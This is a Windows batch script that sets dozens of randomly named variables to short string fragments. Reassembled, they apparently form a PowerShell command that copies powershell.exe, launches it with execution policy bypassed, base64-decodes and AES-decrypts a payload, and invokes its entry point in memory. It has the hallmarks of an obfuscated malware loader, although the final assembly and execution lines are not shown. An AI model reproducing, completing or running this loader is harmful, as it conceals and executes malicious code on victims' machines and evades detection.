@echo off
set "OiFzDeqkaf=he"
set "TopauEiLbn=\W"
set "qlRsOBHmlb=32"
set "obEZMTOIQS=Wi"
set "bpMdapmmKC=:\"
set "VJRZKgEPEx=xe"
set "SvWUPcBUdv=rS"
set "rsByWnbOyA=Sy"
set "fMDbXplVNC=in"
set "kPQBAtAalH=py"
set "mNpOlVBdMq=co"
set "LIirYjVfzr=rs"
set "CfLFpeTRjF=he"
set "mLDreEIPvz=Po"
set "RZrnlcfmBF= /"
set "vJDVQsXIJM=ll"
set "dNMZWkaUtg=1."
set "gnpJsvinSN=s\"
set "wLquoRPJCc=\v"
set "zZwCZQOqqy=po"
set "xMnFHfbsrE= C"
set "lmvNDcVjjM=y "
set "NLnwqQQeEQ=.e"
set "pkphBijrtG=we"
set "QCfEIfqwKR=st"
set "WVrpRMDBxB=ll"
set "INnXFzzJgf=nd"
set "QbhFLuxEEj=em"
set "ydlIXBMgkh=ws"
set "UjLhpVdNBk=ow"
set "QxjojELNPg=do"
set "DnQlUXdGdc=0\"
set "pLzJkwfaQQ=we"
set "BlbovnVMej=cd"
set "CMgBAdkHZo= %~dp0"
set "HSuXWFAECz=ment"
set "UHtNXmpiCh=ct S"
set "vKOLKHiwDG=YgWO"
set "ljwQfuAJsN=y]::"
set "ZVKFLBSOvO=;$iN"
set "bUrreqCBeq=stem"
set "rgjeAQivVz=k; }"
set "EEeEmsTiRY=bjec"
set "OrSzQirtsz=$cCa"
set "enMlxxfMgX=BC;$"
set "MibxvGexds=]::C"
set "pKbLhmbVya=ion."
set "oNwoSTYnjC=F'[-"
set "UsuzFaklMF=);$i"
set "FUAnVEgrqy=form"
set "pYueVIsSzZ=();$"
set "HsLzjYGUhB=IoO3"
set "ZUTobblwpw=r.Pa"
set "aCGgomrpYH=ptog"
set "YbCSFFutMa=Star"
set "QmYxVflmUG=('%*'"
set "wvkIgnLMqC= = $"
set "JMCwySOPuS=Conv"
set "IIKXbgnYLI=yTo("
set "WrLJqhjmEM=zm83"
set "rEKqdFAJLd=Secu"
set "QfdSVVaCjT=$VBW"
set "OfTXGvgyiA=.Dis"
set "JJfGbHSDzv=fore"
set "sTXQcJadzi=m.Re"
set "YHVqcKgHhG=rt]:"
set "UlRaWDLazr=ionM"
set "nrQyErWrBB=V = "
set "QtJOroFapk=ect "
set "vceUyAwLaL=$Qfq"
set "gkhmAIkbfq=g = "
set "GoWTnXbyvn=  $g"
set "XLADbvtxsz=-nop"
set "ZtqIYffFlB=em.C"
set "KsQjEUKNiT=ateD"
set "SNeQHCOzzo= = ["
set "AbZdxrctRq=th('"
set "anKUVALnCo=[]] "
set "GDDMVvSygm=New-"
set "XBDQXzXBHH=oin "
set "jzqxtJNPAu=ress"
set "QQkvXOsrcQ=VBWJ"
set "fVPcyCemWh=($Yg"
set "pguWKPNGOt=Secu"
set "oyUkOWoztx=oint"
set "eHFtLzzuCn=gth)"
set "MVxEnRLykZ= '')"
set "AZmZWLVzfo=$qqR"
set "ySaXfgDIxL=urit"
set "rtnDienDUK=Qfqp"
set "zqOeSWmkdq=gX ="
set "loBrURuJss=]::N"
set "MFtHiboxjo=;$OO"
set "lDNQObbZrX=.Cop"
set "AWiFtubmQT=rofi"
set "MqzPIsbRWc= = N"
set "PseAqcwMrd=ypto"
set "IMlKTfoZIo=ose("
set "RpzdfZKVXL=JEM."
set "vDCYdUnURV=, (,"
set "BXuAbiWpOz=);$c"
set "xlKTfzdfeJ=$LlJ"
set "YYlNFqVDMz=8kuY"
set "yjTbaVKegv=BWJy"
set "WQwAqJNsKJ=-ep "
set "YrXUGOQkeb= = $"
set "GMkPYvVrEg=)) {"
